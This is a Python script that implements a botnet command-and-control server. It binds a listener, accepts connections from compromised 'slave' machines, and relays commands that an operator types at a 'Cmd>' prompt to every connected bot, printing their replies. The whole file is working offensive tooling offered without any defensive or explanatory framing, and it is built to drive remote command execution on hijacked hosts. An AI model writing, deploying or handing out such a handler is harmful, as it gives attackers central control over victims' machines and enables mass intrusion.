import socket
import sys
import os
import threading
import queue
import time

q = queue.Queue()
SocketThread = []
ClientDict = {}


def main():
    if (len(sys.argv) < 3):
        print ("[!] Usage:\n [+] python3 {} <LHOST> <LPORT>\n".format(sys.argv[0]))
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost,lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: {}\n".format(str(ex)))


def listener(lhost,lport,q):
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server.bind((lhost,lport))
    server.listen(100)

    print("[+] Starting C&C server on tcp://{}:{}\n".format(lhost,lport))
    
    BotCmdThread = BotCmd(q)
    BotCmdThread.start()
    while True:
        (client, client_address) = server.accept()
        newthread = BotHandler(client,client_address, q, ClientDict)
        SocketThread.append(newthread)
        newthread.start()


class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)
        self.q = qv2
    
    def run(self):
        while True:
            SendCmd = str(input("Cmd> "))
            if (SendCmd == ""):
                pass
            elif (SendCmd == "exit"):
                for _ in range(len(SocketThread)):
                    time.sleep(0.1)
                    self.q.put(SendCmd+"\n")
                time.sleep(1)
                os._exit(0)
            else:
                print("[+] Sending Command: {} to {} bots.".format(SendCmd,str(len(SocketThread))))
                for _ in range(len(SocketThread)):
                    time.sleep(0.1)
                    self.q.put(SendCmd+"\n")


class BotHandler(threading.Thread):
    def __init__(self, client, client_address, qv, ClientDict):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv
        self.ClientList = ClientDict

    def run(self):
        BotName = threading.current_thread().getName()
        print("\n[*] Slave {}:{} connected with Thread-ID: {}".format(self.ip,self.port,BotName))
        self.ClientList[BotName] = self.client_address
        while True:
                RecvBotCmd = self.q.get()
                try:
                    self.client.send(RecvBotCmd.encode('utf-8'))
                    self.client.settimeout(1)
                    try:
                        resp = self.client.recv(1024).decode('utf-8')
                        print("[+] {} reponse: {}".format(BotName, resp))
                    except:
                        continue
                except Exception as ex:
                    print("Exception occured during command sending: {}".format(ex))
                    break


if __name__ == '__main__':
    main()
